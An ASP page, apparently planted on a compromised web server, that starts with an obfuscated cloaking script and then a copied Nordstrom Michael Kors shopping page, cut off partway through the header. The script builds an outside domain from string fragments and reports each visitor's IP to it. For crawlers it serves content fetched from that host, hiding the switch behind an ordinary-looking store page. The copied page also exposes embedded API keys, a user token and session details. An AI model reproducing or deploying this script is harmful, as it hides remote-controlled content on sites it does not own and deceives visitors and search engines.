﻿<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>










<!--[]-->
<!doctype html>
<!--[if IE 7]><html class="no-js ie7 lt-ie8 lt-ie9" lang="en" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://opengraph.org/schema/"><![endif]-->
<!--[if IE 8]><html class="no-js ie8 lt-ie9" lang="en" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://opengraph.org/schema/"><![endif]-->
<!--[if IE 9]><html class="no-js ie9 lt-ie10" lang="en"><![endif]-->
<!--[if gt IE 9]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />


	<title>Michael Kors Handbags, Clothing &amp; Fragrance | Nordstrom</title>

	
	<meta name="description" content="Free shipping on Michael Kors handbags, fragrance and clothing Nordstrom.com. Shop the latest from Michael Kors. Totally free shipping and returns." />
	<meta name="keywords" content="michael kors" />

	

	<meta property="fb:app_id" content="143447719050737" />
	<meta property="og:type" content="website" />
	<meta property="og:site_name" content="Nordstrom" />
	<meta property="og:url" content="http://shop.nordstrom.com/c/michael-kors" />
	<meta property="og:title" content="Michael Kors Handbags, Clothing &amp; Fragrance | Nordstrom" />
	<meta property="og:description" content="Free shipping on Michael Kors handbags, fragrance and clothing Nordstrom.com. Shop the latest from Michael Kors. Totally free shipping and returns." />

	
	<link rel="canonical" href="http://shop.nordstrom.com/c/michael-kors" />

	
	
<link href="http://m.shop.nordstrom.com/c/michael-kors" media="only screen and (max-width: 640px)" rel="alternate" />


	<link rel="icon" sizes="16x16" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/nordstrom-favicon-evergreen-16x16-7-adam-c64fe357-3f9b-497d-8d81-a1e90138e3dd-fil-file.png?Version=1" />
	<link rel="icon" sizes="24x24" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/nordstrom-favicon-evergreen-24x24-7-adam-150c3439-3207-4668-8228-a1e90138e46f-fil-file.png?Version=1" />
	<link rel="icon" sizes="32x32" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/nordstrom-favicon-evergreen-32x32-7-adam-b2c05453-881d-4965-ac3e-a1e90138e4c4-fil-file.png?Version=1" />
	<link rel="icon" sizes="96x96" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/nordstrom-favicon-evergreen-96x96-7-adam-acd1a749-147a-41aa-b207-a1e90138e5b9-fil-file.png?Version=1" />
	<link rel="apple-touch-icon-precomposed" sizes="57x57" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/n-ios-57x57-7-adam-9b3f89f0-5ec4-45f9-b59f-a1f60123761d-fil-file.png?Version=1" />
	<link rel="apple-touch-icon-precomposed" sizes="72x72" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/n-ios-72x72-7-adam-c2758364-613d-409a-9e8b-a1f6012376af-fil-file.png?Version=1" />
	<link rel="apple-touch-icon-precomposed" sizes="114x114" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/n-ios-114x114-7-adam-4b522586-ee3d-4f12-b2d9-a1f6012376f3-fil-file.png?Version=1" />
	<link rel="apple-touch-icon-precomposed" sizes="144x144" type="image/png" href="http://c.nordstromimage.com/Assets/IDEV/common/favicon/n-ios-144x144-7-adam-ce051cdc-b2b9-4328-9c98-a1f601237746-fil-file.png?Version=1" />


	
	<script>
		// document domain
		document.domain = 'nordstrom.com';

		// page settings
		window.nord = { config: { settings: [] } };




window.nord.config.settings.push({
	"analytics": {
		"pageStart": +new Date,
		"auxNavType": "",
		"categoryId": "",
		
		"pageCategoryId": "6007488",
		"categoryName": "Michael Kors",
		"categoryPath": "0~60145186~6007488",
		"categoryPathAlias": "michael-kors",
		"clientId": "90033273",
		"dataEndpoint": "1901.nordstrom.com",
		"grandParentCategoryName": "Browse Categories",
		"isAuxiliaryNav": "False",
		"isPageviewTaggingEnabled": true,
		"isTaggingEnabled": true,
		"pageId": "BRAND BOUTIQUE SPLASH: Brands > Michael Kors (6007488)",
		"pageTemplate": "WCM",
		"pageType": "",
		"parentCategoryId": "",
		"parentCategoryName": "BrandsM",
		"subCategory": "Browse Categories Michael Kors",
		"SDD": true,
		
		"Division": "",
		"Subdivision": "",
		"Department": "",
		"Class": "",
		
		"TTOParameters": "",
		
		"RecShelvesDisplayed": "",
		"RecShelfNames": "",
		"RecsDisplayedPerShelf": ""
	}
});
window.nord.config.settings.push({
	"cookies": {
		"nordstrom": "nordstrom",
		"domain": ".nordstrom.com",
		"personalization": "personalization",
		"auth" : "authstatus"
	}
});

window.nord.config.settings.push({
	"features": {
		"isEarlyAccessEnabled": false,
		"isEasyCheckoutEnabled": true,
		"isEasyCheckoutHeaderEnabled": true,
		"isFeaturedResultsEnabled": true,
		"isInlineReviewsEnabled": true,
		"isMiniBagEnabled": true,
		"isPersonalizedSizeFitEnabled": true,
		"isPersonalizedSortEnabled": false,
		"isPickupInStoreEnabled": true,
		"isSameDayDeliveryEnabled": true,
		
		"prefetchShopperSegmentEnabled" : true,
		"isRecsEnabled": true,
		"isRRRecsEnabled": true,
		"isSizeSpecificRecsEnabled": false,
		"isShopperPrefsCollectionEnabled": true,
		"isDataLabRecsEnabled": true,
		"isLightWeightRecsEnabled": true,
		"isEadOverrideFCEnabled": false,
		"isDebug": false,
		
		"isBuyButtonSuppressEnabled" : false,
		"isBeautyBoardsEnabled" : true,
		"TTPersonalStylistEnabled" : true
	}
});

window.nord.config.settings.push({
	"personalization": {
		"prefetchRetryCount": 10,
		"prefetchUrl": "/pers/prefetchshoppersegment/",
		"prefetchRequestTimeout": 3000,
		"segmentEngine": "CI"
	}
});
window.nord.config.settings.push({
	"recommendations": {
		"v2": {
			"AnniversaryGWPBrands": ["6576","10869","7989","7020","8664","4831","8616","8290","91","7136","1513","6930","8896","4755","1322","6768","8506","144","6704","163","1486","180","1204","141","4944","1017","216","4394","230","231","8402","4556","1583","8866","8095","8708","5027","1589","10999","6552","6356","8456","10578","6160","8020","394","4841","1514","1824","9222","7463","454","8723","419","8447","444","465","8524","5014","4825","8042","7994","8153","9041","217","6825","1465","4256","8970","6738","7018","3847","8141","6271","5965","675","1553","8449","8325","9360","8259","10788","736","7166","8277","8081","8785","1058"],
			"sources": {
				"Rich Relevance Recs API": {
					"apiKey": "469cc5818c1eb6ac",
					"environment": "recs"
				},
				"Data Lab Recommendo V2": {
					"apiKey": "ae2cb5f94291e0212b71fbd56c2626dc",
					"apiUrl": "https://recommendo.ndl.io/api/v2/recs"
				}
			}
		}
	}
});

(function() {
	function getViewport() {
		var
		obj = window,
		propertyPrefix = 'inner';

		if (! window.innerWidth) {
			obj = document.documentElement || document.body;
			propertyPrefix = 'client';
		}

		return {
			"height": obj[propertyPrefix + 'Height'],
			"width": obj[propertyPrefix + 'Width']
		};
	}
	window.nord.config.settings.push({
		"shopper": {
			"clientInfo": {
				"browserWidth": function() {
					return getViewport().width;
				},
				"browserHeight": function() {
					return getViewport().height;
				},
				"browserTimeOffset": new Date().getTimezoneOffset(),
				"colorDepth": window.screen.colorDepth,
				"screenHeight": window.screen.height,
				"screenWidth": window.screen.width
			},
			"beautyBoardId": "",
			"email" : "",
			"encodedUserToken": "C487AB5152C42C397B25BADF62CA88F6646174653D323031352D30312D3034267573657269643D3634656662613436366562663431636438663837663063393966623233373863",
			"environmentInfo": {
				"isPos": false
			},
			"firstName" : "",
			"gender": 0,
			"hasMultipleRewardsLevels": false,
			"hasQualifiedItem": false,
			"hasSamples": false,
			"id": "64efba466ebf41cd8f87f0c99fb2378c",
			"ipAddress": "23.238.187.188",
			"isEmployee": false,
			"isLoggedIn": false,
			"isRegisteredForFitRecs": false,
			"isEarlyAccessEligible": false,
			"isSameDayDeliveryEligible": false,
			"maxRewardsLevel": 0,
			"sessionId": "1fbbe9b0-45fe-43bd-a236-d34c9d59c0ff",
			"shipToCountry": ""
		}
	});
}());

window.nord.config.settings.push({
	"tto": {
		"isEnabled": true,
		"parentCategoryId": "",
		"shopperSegment": ""
	}
});


window.nord.config.settings.push({
	"urls": {
		"about": "http://about.nordstrom.com/",
		"blog": "http://blogs.nordstrom.com/",
		"chat": "http://about.nordstrom.com/help/livehelp/",
		"gallery": "http://g.nordstromimage.com/imagegallery/store/product/",
		"image": "http://i.nordstromimage.com/images/",
		"imageDelivery": "http://s.nordstromimage.com/ImageDelivery",
		"clientApi": "http://client.api.nordstrom.com/",
		"publicApi": "http://client.api.nordstrom.com/",
		"secure": "https://secure.nordstrom.com/",
		"store": "http://shop.nordstrom.com/",
		"wcmImage": "http://c.nordstromimage.com/"
	}
});

window.nord.config.settings.push({
	"environment": "Production"
});
	</script>





<script> var require = {"paths":{"nord/featureSet/internalFlashVideo":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/internalFlashVideo.js?v=201404081024","nord/featureSet/keywordSearch":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/keywordSearch.js?v=201411121318b","nord/featureSet/minibag":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/minibag.js?v=201410161359","nord/featureSet/prefetchShopperInfo":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/prefetchShopperInfo.js?v=201409181727","nord/featureSet/ttoGlobal":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/ttoGlobal.js?v=201310240958","nord/global":"http://c.nordstromimage.com/System/JavaScript/shop/nord/global.js?v=201412040919","nord/featureSet/scrubber":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/scrubber.js?v=201402041026","nord/featureSet/countdownTimer":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/countdownTimer.js?v=201405211115","nord/featureSet/imageZoom":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/imageZoom.js?v=201409251018","nord/featureSet/productVideo":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/productVideo.js?v=201409251018","nord/featureSet/componentTooltip":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/componentTooltip.js?v=201406181126","nord/featureSet/inspectorGadget":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/inspectorGadget.js?v=201411030949","nord/featureSet/scrubber_Deprecated":"http://c.nordstromimage.com/System/JavaScript/shop/nord/featureSet/scrubber_Deprecated.js?v=201412090923","nordMain":"http://c.nordstromimage.com/System/JavaScript/shop/nordMain.js?v=201412300936"},"baseUrl":"http://c.nordstromimage.com/system/javascript/shop"}</script>



		<link rel="stylesheet"  href="http://c.nordstromimage.com/System/CSS/shop/global.css?v=201412300919">
		<link rel="stylesheet"  href="http://c.nordstromimage.com/System/CSS/shop/layout/boutique.css?v=201412300919">



        <script src="http://i.nordstromimage.com/images//rum/fsrum.js"></script>
	<script src="http://c.nordstromimage.com/system/javascript/shop/thirdparty/lib/raygun.vanilla.min-1.13.1_modernizr-custom-2.6.2.js"></script>
	<script>
		Raygun.init("iI/Upkmv/Q6Pk4gNDfhgCQ==", {
			ignoreAjaxAbort: true,
			ignore3rdPartyErrors: true
		}).whitelistCrossOriginDomains([
			'nordstrom.com',
			'nordstromimage.com'
		]).attach();
	</script>
		<script type="text/javascript" src="//s.btstatic.com/tag.js">{ site: "KxHRmBh", mode: "sync" }</script>
</head>
<body data-page-type="wcm" data-modules="">
	

<svg class="hidden">
	<defs>
		<g id="nordstrom-logo">
			<path d="M32.295,0.47c6.275,0,10.377,4.648,10.377,11.467c0,6.817-4.184,11.542-10.377,11.542c-6.119,0-10.378-4.885-10.378-11.542
				C21.916,5.274,26.176,0.47,32.295,0.47z M32.295,21.926c4.493,0,6.97-3.559,6.97-9.989c0-6.354-2.478-9.995-6.97-9.995
				c-4.492,0-6.973,3.642-6.973,9.838C25.322,18.367,27.726,21.926,32.295,21.926z"/>
			<path d="M86.226,11.549c0,7.126-4.029,11.537-10.921,11.537h-6.97c0,0,0.154-7.047,0.154-11.149c0-4.032-0.154-11.079-0.154-11.079
				h7.979C82.821,0.858,86.226,4.5,86.226,11.549z M82.895,11.625c0-6.042-2.789-9.451-8.208-9.451c-2.367,0-3.315,0.154-3.315,0.154
				s0.208,0.542,0.2,1.409c-0.023,1.928-0.06,5.468-0.06,8.199c0,2.979,0.064,6.167,0.109,8.01c0.024,0.986-0.203,1.592-0.203,1.592
				s0.901,0.156,2.881,0.156C80.029,21.695,82.895,18.131,82.895,11.625z"/>
			<path d="M153.887,0.47c6.273,0,10.379,4.648,10.379,11.467c0,6.817-4.185,11.542-10.379,11.542
				c-6.121,0-10.379-4.885-10.379-11.542C143.508,5.274,147.766,0.47,153.887,0.47z M153.887,21.926c4.495,0,6.971-3.559,6.971-9.989
				c0-6.354-2.476-9.995-6.971-9.995c-4.494,0-6.972,3.642-6.972,9.838C146.915,18.367,149.313,21.926,153.887,21.926z"/>
			<path d="M2.31,15.262c0,5.354,0.232,7.824,0.232,7.824H0.219c0,0,0.308-8.982,0.308-17.58c0-1.472-0.078-4.648-0.078-4.648h1.628
				c0,0,6.195,8.784,10.316,14.5c0.465,0.641,1.051,1.703,1.477,2.504c0,0-0.175-1.512-0.175-2.889v-6.29
				c0-5.705-0.31-7.824-0.31-7.824h2.321c0,0-0.308,8.13-0.308,17.581c0,0.932,0.077,4.646,0.077,4.646H13.85
				c0,0-6.075-8.656-10.244-14.435C2.969,7.77,2.59,7.15,2.164,6.298c0,0,0.146,1.894,0.146,2.89V15.262L2.31,15.262z"/>
			<path d="M96.607,21.926c2.512-0.07,4.441-2.236,4.07-4.637c-0.295-1.9-1.736-3.043-4.148-4.428
				c-3.084-1.763-4.919-3.055-5.233-6.011c-0.39-3.685,2.694-6.302,6.395-6.458c2.088-0.087,3.967,0.502,4.723,0.736V3.49
				c0,0-1.77-1.703-4.568-1.703c-1.947,0-4.068,1.24-4.068,3.432c0,1.949,1.531,2.887,4.223,4.47c3.596,2.117,5.402,3.812,5.402,7
				c0,3.949-3.236,6.789-7.105,6.789c-2.094,0-4.068-0.445-4.727-0.74v-2.594C91.57,20.145,93.432,22.016,96.607,21.926z"/>
			<path d="M121.086,0.858v2.099c0,0-1.635-0.545-4.262-0.545h-1.459c0,0,0.049,0.586,0.039,1.421c0,0-0.053,3.971-0.053,5.082
				c0,6.193,0.311,14.171,0.311,14.171h-3.484c0,0,0.309-7.979,0.309-14.171c0-1.11-0.059-5.082-0.059-5.082
				c-0.01-0.836,0.041-1.421,0.041-1.421h-1.453c-2.639,0-4.262,0.545-4.262,0.545V0.858H121.086z"/>
			<path d="M190.219,23.078h-3.284c0,0-0.184-8.109-0.498-13.814c-0.033-0.68-0.029-1.542-0.029-2.477c0,0-0.348,1.181-0.862,2.398
				l-6.094,14.43c0,0-3.409-7.797-6.1-13.645c-0.408-0.881-0.938-2.424-1.299-3.184c0.05,1.216-0.027,2.515-0.103,3.5
				c-0.406,5.726-0.521,12.791-0.521,12.791h-2.135l1.372-22.226h1.911c0,0,4.1,9.235,6.73,14.882c0.332,0.705,0.74,1.527,0.906,2.273
				c0.255-0.846,0.521-1.557,0.815-2.246c2.426-5.724,6.133-14.909,6.133-14.909h1.911L190.219,23.078z"/>
			<path d="M138.984,6.048c0,2.94-1.854,4.959-5.111,5.812c2.094,3.871,6.351,11.226,6.351,11.226h-3.483
				c0,0-1.855-3.791-6.658-12.236h0.389c3.561,0,5.42-1.471,5.42-4.415c0-2.556-1.551-4.183-4.494-4.183
				c-0.852,0-2.182,0.031-2.182,0.031s0.182,0.505,0.182,1.929V15.65c0,4.959,0.235,7.436,0.235,7.436h-3.333
				c0,0,0.234-8.754,0.234-13.319c0-3.177-0.234-8.909-0.234-8.909h6.568C136.822,0.858,138.984,2.717,138.984,6.048z"/>
			<path d="M61.569,6.048c0,2.94-1.859,4.959-5.113,5.812c2.091,3.871,6.351,11.226,6.351,11.226h-3.484c0,0-1.86-3.791-6.662-12.236
				h0.39c3.559,0,5.417-1.471,5.417-4.415c0-2.556-1.548-4.183-4.49-4.183c-0.852,0-2.185,0.031-2.185,0.031s0.185,0.505,0.185,1.929
				V15.65c0,4.959,0.232,7.436,0.232,7.436h-3.332c0,0,0.235-8.754,0.235-13.319c0-3.177-0.235-8.909-0.235-8.909h6.57
				C59.4,0.858,61.569,2.717,61.569,6.048z"/>
		</g>

		<g id="facebook">
			<path d="M18.486 12.359h-2.375v-1.557c0-0.584 0.389-0.721 0.66-0.721c0.272 0 1.7 0 1.7 0 V7.51l-2.307-0.009c-2.562 0-3.145 1.918-3.145 3.145v1.713h-1.482v2.648h1.482c0 3.4 0 7.5 0 7.497h3.115c0 0 0-4.137 0-7.497 h2.103L18.486 12.359z"></path>
			<g>
				<path d="M15 0C6.73 0 0 6.7 0 14.999C0 23.3 6.7 30 15 30c8.271 0 15-6.73 15-15.001C30 6.7 23.3 0 15 0z M15 27.953c-7.14 0-12.951-5.811-12.951-12.954C2.049 7.9 7.9 2 15 2.047c7.145 0 13 5.8 13 13 C27.955 22.1 22.1 28 15 27.953z"></path>
			</g>
		</g>

		<g id="twitter">
			<path d="M22.518 10.341c-0.553 0.246-1.146 0.411-1.77 0.5 c0.636-0.381 1.124-0.985 1.354-1.705c-0.595 0.354-1.254 0.609-1.957 0.747c-0.562-0.598-1.361-0.973-2.248-0.973 c-1.701 0-3.081 1.379-3.081 3.081c0 0.2 0 0.5 0.1 0.703c-2.561-0.129-4.831-1.355-6.351-3.219 c-0.265 0.455-0.416 0.984-0.416 1.547c0 1.1 0.5 2 1.4 2.566c-0.506-0.018-0.98-0.155-1.396-0.387 c-0.001 0.014-0.001 0.026-0.001 0.039c0 1.5 1.1 2.7 2.5 3.021c-0.258 0.069-0.53 0.106-0.811 0.1 c-0.199 0-0.393-0.02-0.58-0.055c0.392 1.2 1.5 2.1 2.9 2.141c-1.055 0.826-2.384 1.318-3.827 1.3 c-0.248 0-0.493-0.014-0.734-0.043c1.363 0.9 3 1.4 4.7 1.385c5.666 0 8.766-4.695 8.766-8.767 c0-0.133-0.003-0.266-0.009-0.398C21.582 11.5 22.1 11 22.5 10.341z"></path>
			<g>
				<path d="M15 0C6.73 0 0 6.7 0 14.999C0 23.3 6.7 30 15 30c8.271 0 15-6.73 15-15.001C30 6.7 23.3 0 15 0z M15 27.953c-7.141 0-12.952-5.811-12.952-12.955C2.048 7.9 7.9 2 15 2.047c7.143 0 13 5.8 13 13 C27.954 22.1 22.1 28 15 27.953z"></path>
			</g>
		</g>

		<g id="pinterest">
			<path d="M15.736 7.486c-4.108 0-6.18 2.945-6.18 5.401c0 1.5 0.6 2.8 1.8 3.3 c0.197 0.1 0.4 0 0.433-0.215c0.04-0.152 0.135-0.536 0.177-0.695c0.058-0.217 0.035-0.293-0.125-0.482 c-0.348-0.411-0.57-0.943-0.57-1.696c0-2.185 1.635-4.141 4.257-4.141c2.321 0 3.6 1.4 3.6 3.3 c0 2.493-1.104 4.597-2.74 4.597c-0.905 0-1.583-0.748-1.365-1.666c0.26-1.095 0.764-2.277 0.764-3.068 c0-0.708-0.381-1.298-1.167-1.298c-0.924 0-1.667 0.957-1.667 2.238c0 0.8 0.3 1.4 0.3 1.368s-0.947 4.01-1.113 4.7 c-0.33 1.398-0.049 3.113-0.025 3.285c0.014 0.1 0.1 0.1 0.2 0.051c0.086-0.111 1.188-1.471 1.562-2.83 c0.105-0.385 0.608-2.377 0.608-2.377c0.3 0.6 1.2 1.1 2.1 1.078c2.779 0 4.665-2.534 4.665-5.926 C21.21 9.9 19 7.5 15.7 7.486z"></path>
			<g>
				<path d="M14.995 0c-8.27 0-15 6.729-15 14.999c0 8.3 6.7 15 15 15.001c8.272 0 15-6.73 15-15.001 C29.995 6.7 23.3 0 15 0z M14.995 27.953c-7.141 0-12.952-5.811-12.952-12.954c0-7.141 5.812-12.952 12.952-12.952 c7.144 0 13 5.8 13 12.952C27.949 22.1 22.1 28 15 27.953z"></path>
			</g>
		</g>

		<g id="instagram">
			<path d="M9.814 7.992h10.402c0.987 0 1.8 0.8 1.8 1.796v10.401 c0 0.987-0.809 1.799-1.796 1.799H9.814c-0.987 0-1.796-0.812-1.796-1.799V9.788C8.019 8.8 8.8 8 9.8 7.992L9.814 7.992z M18.213 9.546c-0.346 0-0.631 0.284-0.631 0.63v1.508c0 0.3 0.3 0.6 0.6 0.63h1.583c0.349 0 0.63-0.283 0.63-0.63v-1.508 c0-0.346-0.281-0.63-0.63-0.63H18.213L18.213 9.546z M20.434 13.91h-1.231c0.114 0.4 0.2 0.8 0.2 1.2 c0 2.327-1.949 4.214-4.35 4.214c-2.403 0-4.351-1.888-4.351-4.214c0-0.417 0.065-0.82 0.181-1.201H9.574v5.912 c0 0.3 0.2 0.6 0.6 0.556h9.745c0.309 0 0.559-0.252 0.559-0.556V13.91L20.434 13.91z M15.03 12.2 c-1.553 0-2.811 1.22-2.811 2.725c0 1.5 1.3 2.7 2.8 2.723c1.552 0 2.812-1.22 2.812-2.723 C17.842 13.5 16.6 12.2 15 12.234z"></path>
			<g>
				<path d="M15 0C6.729 0 0 6.7 0 14.999C0 23.3 6.7 30 15 30c8.273 0 15-6.73 15-15.001 C30 6.7 23.3 0 15 0z M15 27.953c-7.14 0-12.952-5.811-12.952-12.955C2.048 7.9 7.9 2 15 2 c7.143 0 13 5.8 13 12.951C27.955 22.1 22.1 28 15 27.953z"></path>
			</g>
		</g>

		<g id="youtube">
			<path d="M15 0C6.729 0 0 6.7 0 14.999C0 23.3 6.7 30 15 30c8.271 0 15-6.73 15-15.001 C30 6.7 23.3 0 15 0z M15 27.953c-7.14 0-12.952-5.812-12.952-12.954C2.048 7.9 7.9 2 15 2 c7.143 0 13 5.8 13 12.952C27.954 22.1 22.1 28 15 27.953z"></path>

			<path d="M22.725 11.219c-0.197-0.852-0.894-1.479-1.729-1.573 c-1.985-0.221-3.993-0.222-5.992-0.221c-1.998-0.001-4.008 0-5.99 0.221c-0.839 0.095-1.533 0.722-1.729 1.6 C7.003 12.4 7 13.8 7 15s0 2.6 0.3 3.781c0.196 0.9 0.9 1.5 1.7 1.572c1.984 0.2 4 0.2 6 0.2 c1.998 0 4 0 5.99-0.222c0.837-0.094 1.532-0.722 1.729-1.572C22.998 17.6 23 16.2 23 15S23.002 12.4 22.7 11.219z M13.383 17.248v-4.429l4.225 2.215L13.383 17.248z"></path>
		</g>

		<g id="wanelo">
			<path d="M15 0C6.729 0 0 6.7 0 14.999C0 23.3 6.7 30 15 30c8.271 0 15-6.73 15-15.001 C30 6.7 23.3 0 15 0z M15 27.953c-7.14 0-12.952-5.812-12.952-12.954C2.048 7.9 7.9 2 15 2 c7.143 0 13 5.8 13 12.952C27.954 22.1 22.1 28 15 27.953z"></path>
			<rect x="8" y="8" width="4" height="4"></rect>
			<rect x="13" y="8" width="4" height="4"></rect>
			<rect x="18" y="8" width="4" height="4"></rect>
			<rect x="8" y="13" width="4" height="4"></rect>
			<rect x="13" y="13" width="4" height="4"></rect>
			<rect x="8" y="18" width="4" height="4"></rect>
			<rect x="13" y="18" width="4" height="4"></rect>
			<rect x="18" y="13" width="4" height="4"></rect>
		</g>

		<g id="tumblr">
			<path d="M15 0C6.729 0 0 6.7 0 14.999C0 23.3 6.7 30 15 30c8.271 0 15-6.73 15-15.001 C30 6.7 23.3 0 15 0z M15 27.953c-7.14 0-12.952-5.812-12.952-12.954C2.048 7.9 7.9 2 15 2 c7.143 0 13 5.8 13 12.952C27.954 22.1 22.1 28 15 27.953z"></path>
			<path d="M18.596 19.432c-0.277 0.131-0.811 0.248-1.207 0.256c-1.195 0.033-1.425-0.838-1.436-1.471v-4.65h2.999 v-2.261h-2.988V7.501c0 0-2.152 0-2.188 0c-0.035 0-0.098 0.032-0.107 0.112c-0.128 1.165-0.674 3.208-2.939 4.025v1.929h1.511 v4.878c0 1.7 1.2 4 4.5 3.99c1.101-0.02 2.318-0.479 2.586-0.875L18.596 19.432z"></path>
		</g>

		<g id="blog">
			<path d="M14.996,0C6.727,0-0.001,6.729-0.001,14.999C-0.001,23.271,6.727,30,14.996,30
						c8.271,0,14.997-6.729,14.997-15.001C29.993,6.729,23.267,0,14.996,0z M14.996,27.952c-7.139,0-12.95-5.811-12.95-12.953
						c0-7.14,5.812-12.953,12.95-12.953c7.143,0,12.953,5.812,12.953,12.953C27.948,22.143,22.139,27.952,14.996,27.952z"/>

			<path d="M22.995,10.239c-0.006-0.901-0.609-2.242-2.249-2.242H9.227c-0.898,0.004-2.232,0.612-2.223,2.258
					l-0.006,8.492c0.004,0.794,0.465,1.929,1.667,2.199l0.012,1.718c0,0.377,0.221,0.716,0.564,0.868
					c0.126,0.058,0.258,0.084,0.391,0.084c0.229,0,0.457-0.081,0.634-0.239l2.687-2.375L20.757,21c0.161,0,1.004-0.03,1.631-0.662
					c0.279-0.283,0.613-0.788,0.608-1.588L22.995,10.239L22.995,10.239z M20.996,17.998c0,0.553-0.365,1.002-0.919,1.002h-7.491
					c-0.233,0-0.458,0.173-0.635,0.328l-1.374,1.218l-0.004-0.496c-0.004-0.519-0.141-1.039-0.661-1.049
					c-0.552,0-0.916-0.369-0.916-0.921v-7.175c0-0.55,0.363-0.904,0.916-0.904h10.165c0.543,0,0.899,0.255,0.918,0.793
					c0,0.001,0.001,0.004,0.001,0.006v0.015c0,0.003,0,0.006,0,0.009V17.998z"/>

			<path d="M18.453,15h-6.915c-0.277,0-0.501-0.224-0.501-0.5S11.261,14,11.539,14h6.915
				c0.276,0,0.5,0.226,0.5,0.501S18.729,15,18.453,15z"/>

			<path d="M18.453,17h-6.915c-0.277,0-0.501-0.223-0.501-0.5c0-0.275,0.224-0.499,0.501-0.499h6.915
				c0.276,0,0.5,0.224,0.5,0.499C18.953,16.777,18.729,17,18.453,17z"/>

			<path d="M18.453,13h-6.915c-0.277,0-0.501-0.224-0.501-0.501c0-0.275,0.224-0.5,0.501-0.5h6.915
				c0.276,0,0.5,0.224,0.5,0.5C18.953,12.776,18.729,13,18.453,13z"/>
		</g>
	</defs>
</svg>
			<script src="http://c.nordstromimage.com/system/javascript/shop/thirdparty/lib/mmcore.js"></script>





<a id="skip-nav" href="#skip-nav-end" class="ada-hidden ada-skip-nav">Skip Navigation</a>
<aside class="global-promo-bar promo-type-anniversary">
	<div class="global-promo-bar-content">



<section id="text-promotion-barpromo" class="text-promo">
	<h2>E-Gift Cards.</h2>
	<p>
		Give them the gift they really wanted.
			
				<a href="e-gift-cards?origin=header-top-promo" manual_cm_sp="corp-_-1103egcholidaymessaging-_-swpheaderrightover_shop" title="Shop now">Shop now</a>.
			
	</p>
</section>	</div>
</aside>
<header id="site-header" role="banner" class="clearfix">
	
	<div id="shopper-nav-wrap">
		<span>
			<ul id="shopper-nav" role="navigation" aria-label="Account Navigation">
				<li id="shopper-status">


<a href="https://secure.nordstrom.com/SignIn.aspx?ReturnURL=http%3a%2f%2fshop.nordstrom.com%2fc%2fmichael-kors&amp;origin=tab" title="Sign in to your Nordstrom.com account">Sign In</a>
				</li>
						<li>

<a href="https://secure.nordstrom.com/myaccount/accountsummary.aspx?origin=tab" title="Go to your Nordstrom.com account">Your Account</a></li>
						<li>

<a href="/c/recommendations/?origin=tab" title="Recommendations">Recommendations</a></li>
						<li>

<a href="/c/stores?origin=tab" title="Stores &amp; Events">Stores & Events</a></li>
						<li>

<a href="https://secure.nordstrom.com/wishlist.aspx?view=guest&amp;origin=tab" title="Go to your Nordstrom.com Wish List">Wish List</a></li>
			</ul>
		</span>
		<span id="shopping-bag-links">

	<a id="shopping-bag-link" href="https://secure.nordstrom.com/shoppingbag.aspx?origin=tab"  class="split-button" ><span class="ir sprite sprite-mini-bag"></span>Shopping Bag <b>[<span id="shopping-bag-count">0</span>]</b></a>


<a href="https://secure.nordstrom.com/shoppingbag.aspx?bco=1&amp;origin=tab" id="easy-checkout-link" title="Checkout">Checkout</a>		<div id="mini-bag-section" class="mini-bag-section">
			<div class="mini-bag-section-content clearfix">
				<div class="mini-bag-section-content-top">
					<div class="item-message"></div>
					<a id="mini-bag-close" class="ir sprite sprite-close" name="Close - Mini" href="" title="Close">Close</a>
				</div>
				<div class="mini-bag-section-content-scroll">
					<ul class="clearfix"></ul>
				</div>
				<div class="mini-bag-section-content-bottom clearfix"></div>
			</div>
		</div>

		</span>
	</div>
	

	
	<div id="site-branding">
			<a href="/?origin=tab-logo" id="nordlogo-primary">
				<svg viewBox='0, 0, 191, 24'>
					<use xlink:href='#nordstrom-logo'/>
						<img class="svg-fallback hidden" data-fallback="http://c.nordstromimage.com/Assets/IDEV/brand/nordstrom/nordstrom-logo-7-adam-02172f8b-19da-43e5-915a-a1e9013250e4-fil-file.gif?Version=1" alt="NORDSTROM" />
				</svg>
			</a>



<section id="text-promotion-mainpromo" class="text-promo">
	<h2>Clearance Sale: Save up to 50%.</h2>
	<p>
		Through January 4.
			
